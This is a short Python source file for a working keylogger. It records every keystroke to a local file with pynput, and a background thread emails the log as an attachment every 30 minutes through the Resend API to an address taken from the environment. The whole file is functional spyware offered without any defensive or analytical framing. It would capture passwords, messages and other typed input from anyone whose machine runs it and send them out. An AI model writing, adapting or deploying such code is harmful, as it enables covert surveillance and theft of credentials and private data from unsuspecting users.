#!/usr/bin/env python3
import os
import time
import threading

from dotenv import load_dotenv
from pynput.keyboard import Listener
import resend

load_dotenv()

resend.api_key = os.environ["RESEND_API_KEY"]

LOG_FILE = "keys.txt"
EMAIL_DELAY = 1800  # delay in seconds


def send_email():
    while True:
        try:
            with open(LOG_FILE, "rb") as f:
                file_data = f.read()

            attachment: resend.Attachment = {
                "content": list(file_data),
                "filename": f.name,
            }

            params: resend.Emails.SendParams = {
                "from": "Keylogger <onboarding@resend.dev>",
                "to": [os.environ["EMAIL"]],
                "subject": "Keylogger Logs",
                "html": "<p>This file contains the logs.</p>",
                "attachments": [attachment],
            }

            resend.Emails.send(params)
        except FileNotFoundError:
            pass

        time.sleep(EMAIL_DELAY)


def on_press(key):
    with open(LOG_FILE, "a") as log:
        key = str(key).replace("'", "")
        if key == "Key.space":
            key = " "
        elif key == "Key.enter":
            key = "\n"
        elif key == "Key.shift":
            key = ""
        elif key == "Key.backspace":
            key = " [Backspace] "
        elif key == "Key.esc":
            key = " [Escape] "
        log.write(key)


thread = threading.Thread(target=send_email, daemon=True)
thread.start()

with Listener(on_press=on_press) as listener:
    listener.join()
